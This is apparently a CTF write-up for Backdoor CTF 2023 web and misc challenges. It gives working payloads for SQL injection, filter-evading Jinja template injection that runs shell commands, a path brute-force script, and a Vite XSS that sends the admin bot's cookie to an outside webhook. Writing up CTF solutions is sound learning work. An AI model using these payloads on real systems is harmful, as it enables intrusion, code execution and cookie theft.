---
title: "Backdoor CTF 2023"
description: "Writeup for challenges in Backdoor CTF 2023"
summary: "Writeup for challenges in Backdoor CTF 2023"
categories: ["Writeup"]
tags: ["Web Exploitation","Misc", "CTF"]
#externalUrl: ""
date: 2023-12-18
draft: false
---

<!-- .slide: style="font-size: 12px;" -->


<h1>Backdoor CTF 2023 - Writeup Challenges</h1>


## web/too-many-admins
![image](https://hackmd.io/_uploads/Bylp_-C8T.png)

This chall gives me a source. When read `index.php` i saw this line:
```php=
if($userParam){
    if($userParam !=  "all"){
    $query = "SELECT username, password, bio FROM users where username = '$userParam' ";
    }else{
    $query = "SELECT username, password, bio FROM users ";

    }
    $result = $conn->query($query);
```

So it is simple SQL Injection and the flag is hide in the random admin's bio.

```sql=
CREATE PROCEDURE GenerateRandomUsers()
BEGIN
    DECLARE i INT DEFAULT 0;
    WHILE i < 500 DO
        IF i = {SOME_NUMBER} THEN
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                'REDACTED',
                'Flag{REDACTED}'
            );
        ELSE
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                MD5(CONCAT('admin',i,RAND())),
                CONCAT('Bio for admin', i)
            );
        END IF;
        SET i = i + 1;
    END WHILE;
END //
DELIMITER ;
```

Final payload:
`http://34.132.132.69:8000/?user=admin0' UNION SELECT username, bio, password FROM users where INSTR(bio,'flag{')-- -`
![image](https://hackmd.io/_uploads/H13DTkAUT.png)
Flag: `flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}`

## web/Unintelligible-Chatbot
![image](https://hackmd.io/_uploads/Hka6uZCLp.png)


This web gives me a chatbox with bot and then show the result to user. 
![image](https://hackmd.io/_uploads/Sy1p610IT.png)
When i saw that. i think about SSTI (Server-side template injection). So i try `{{7*7}}` first.
![image](https://hackmd.io/_uploads/BJkK01CIT.png)
Bingo. But this chall has filter some characters so i need to bypass filter to get the flag. You can refer how to bypass the filter from the documentation at [this link](https://hackmd.io/@Chivato/HyWsJ31dI). Idea to bypass that you change the blacklist word into hex and use attr to bypass dot. 
Final payload:
`{{"foo"|attr('\137\137\143\154\141\163\163\137\137')|attr('\137\137\142\141\163\145\137\137')`
`|attr('\137\137\163\165\142\143\154\141\163\163\145\163\137\137')()|attr('\137\137\147\145\164\151\164\145\155\137\137')(352)|attr('\137\137\151\156\151\164\137\137')|attr('\137\137\147\154\157\142\141\154\163\137\137')`
`|attr('\137\137\147\145\164\151\164\145\155\137\137')("os")|attr('popen')('cat flag')|attr('read')()}}`
![image](https://hackmd.io/_uploads/Hk2x8xCIa.png)
Flag: `flag{n07_4n07h3r_5571_ch4ll3n63}`

## web/space-war

![image](https://hackmd.io/_uploads/r1VSUl0I6.png)

The challenge gives me a description with these letters are written in uppercase so i think the username is in the path of server. And we need to brute a little bit. Simple script to get the username:

```python=
import requests
import string

username = ""
while True:
    for char in (string.ascii_letters + string.digits):
        url = f"http://34.132.132.69:8005/{username+char}"
        res = requests.get(url=url)
        if "You are on a wrong path, This doesn't exist" not in res.text:
            username+=char
            print("[+] Founded a char: " + username)
```

![image](https://hackmd.io/_uploads/HJbTxZCL6.png)
Then add a simple SQL injection to bypass. `" or 1=1; -- -` to get the flag. 
![image](https://hackmd.io/_uploads/B1ki_-R8T.png)

Flag: `flag{1_kn0w_y0u_will_c0me_b4ck_S0M3DAY_0dsf513sg445s}`

## misc/halo-jack

![image](https://hackmd.io/_uploads/SJS1w-1vT.png)

This challenge takes me a lot of time ~~(Guessy maybe)~~. And then i think about brute force all the commands that can use in my shell. And then i saw that `lssr` and `pr` can be used [here](https://pypi.org/project/lssr/0.3.0/) and [here](https://www.ibm.com/docs/ro/aix/7.2?topic=p-pr-command). After research i saw that `lssr` and `pr` is alternative ls command and cat command.
![image](https://hackmd.io/_uploads/BJPuPQJDa.png)

> Flag is in lovebirds.txt. 

![image](https://hackmd.io/_uploads/By1jw7Jwa.png)
Flag: `flag{th3_4uth0rs_4r3_1n_l0v3_w1th34ch_0th3r}`

## web/armoured-notes


I think about XSS injection when this web gives me a bot to visit the url i give. So the idea is giving the url have xss to take the bot cookie (which is the flag). The first thing we need to bypass isAdmin. 

Source code route report and posts:
```js=
app.post("/report", async (req, res, next) => {
    const { url } = req.body;
    if (!url) {
      return res.status(400).send({ msg: "Url is missing." });
    }
    if (!RegExp(urlRegex).test(url)) {
      return res
        .status(422)
        .send({ msg: "URL din't match this regex format " + bot.urlRegex });
    }
    if (await bot(url)) {
      return res.send({ msg: "Admin successfully visited the URL." });
    } else {
      return res.status(500).send({ msg: "Admin failed to visit the URL." });
    }
  });

  app.get("/posts/:id", async (req, res, next) => {
    try {
      const post = await diaryCollection.findOne({
        _id: new ObjectId(req.params.id),
      });
      if (!post) {
        return res.status(404).json({ code: "err" });
      }
      const url = req.originalUrl;

      let template;
      template = fs.readFileSync(resolve("views/post.html"), "utf-8");
      template = await vite.transformIndexHtml(url, template);
      const render = (await vite.ssrLoadModule("/utils/router.js")).render;

      const appHtml = await render(url, __dirname, req);

      const html = template.replace(`<!--app-html-->`, appHtml);

      res.status(200).set({ "Content-Type": "text/html" }).end(html);
    } catch (e) {
      res.status(500).end(e.stack);
    }
  });
```

After read a source a little bit a see this:

```js=
app.post("/create", async (req, res, next) => {
    let obj = duplicate(req.body);

    if (obj.uname === "admin" && obj.pass == process.env.PASSWORD) {
      obj.isAdmin = true;
    }
    if (obj.isAdmin) {
      const newEntry = req.body;

      try {
        const result = await diaryCollection.insertOne(newEntry);
        return res.json({ code: result.insertedId });
      } catch (err) {
        console.error("Failed to insert entry", err);
        return res.status(500).json({ code: "err" });
      }
    }
    return res.json({ code: "err" });
  });
  app.post("/save", async (req, res, next) => {
    let { id, message } = req.body;

    try {
      await diaryCollection.updateOne(
        { _id: new ObjectId(id) },
        { $set: { message: message } }
      );
      return res.json({ code: "success" });
    } catch (err) {
      console.error("Failed to update diary entry", err);
      return res.status(500).json({ code: "err" });
    }
  });
```

Let check how the duplicate function is defined.

```js=
export function duplicate(body) {
    let obj={}
    let keys = Object.keys(body);
    keys.forEach((key) => {
      if(key !== "isAdmin")
      obj[key]=body[key];
    })
    return obj;
  }
```
It takes an object (body) as an argument and returns a new object (obj) with the same properties as the input object, excluding the property with the key "isAdmin". It uses the Object.keys method to iterate over the keys of the input object and creates a new object without including the "isAdmin" property. It looks like prototype pollution that we can inject isAdmin when post `/create`.

![image](https://hackmd.io/_uploads/Hkjn-bxDT.png)

So i create a id that can give to bot url to visit. But how to take the admin cookie? After searching about vitejs xss injection i see [this](https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97?cve=title). The last thing to do is build a payload send to my server to get the flag. 
Final payload: `http://34.132.132.69:8001/posts/658276ae99d634eec4c73710/?"></script><script>location='https://webhook.site/394f8039-82d9-432f-b9f0-b62b8cff5ce4/'+document.cookie</script>`

![image](https://hackmd.io/_uploads/SJ8XQ-lva.png)

Flag: `flag{pR0707yP3_p0150n1n9_AND_v173j5_5ay_n01c3_99}`